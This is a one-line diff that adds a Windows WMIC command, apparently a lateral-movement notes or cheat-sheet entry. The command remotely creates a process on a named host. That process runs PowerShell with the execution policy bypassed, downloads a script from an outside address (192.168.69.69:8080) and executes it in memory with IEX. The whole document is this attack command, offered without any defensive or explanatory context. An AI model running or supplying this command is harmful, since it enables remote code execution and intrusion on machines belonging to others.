@@ -1,0 +1,1 @@
+wmic /node:<hostname/IP> /user: /password: process call create "powershell.exe -exec bypass -Command IEX (New-Object Net.webclient).Downloadstring(‘http://192.168.69.69:8080/blah’)"
